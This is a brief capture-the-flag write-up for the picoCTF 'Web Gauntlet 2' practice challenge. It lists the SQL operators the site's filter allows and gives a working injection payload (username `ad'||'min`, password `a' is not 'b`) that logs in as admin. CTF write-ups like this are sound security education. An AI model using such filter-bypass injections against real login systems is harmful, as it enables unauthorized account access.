# Web Gauntlet 2
https://play.picoctf.org/practice/challenge/174

> This website looks familiar... Log in as admin Site: http://mercury.picoctf.net:26215/ Filter: http://mercury.picoctf.net:26215/filter.php

## Steps

1. Look at the filters for the SQL injection and the query for login, and find out that somehow need to bypass filters and query presented
![alt text](<images/Screenshot 2025-09-10 144702.png>)
![alt text](<images/Screenshot 2025-09-10 144714.png>)
    This means the only possible operators are:
    ```
    +
    -
    %
    BETWEEN
    EXISTS
    IN
    NOT IN
    LIKE
    GLOB
    NOT
    OR
    IS NULL
    IS
    IS NOT
    ||
    UNIQUE
    |
    &
    ```

2. Use `||` to concatenate admin and use `IS NOT` to bypass check to injection so payload is
![alt text](<images/Screenshot 2025-09-10 145032.png>)
    Username: `ad'||'min`

    Password: `a' is not 'b`


3. Get flag in filter page
![alt text](<images/Screenshot 2025-09-10 145212.png>)
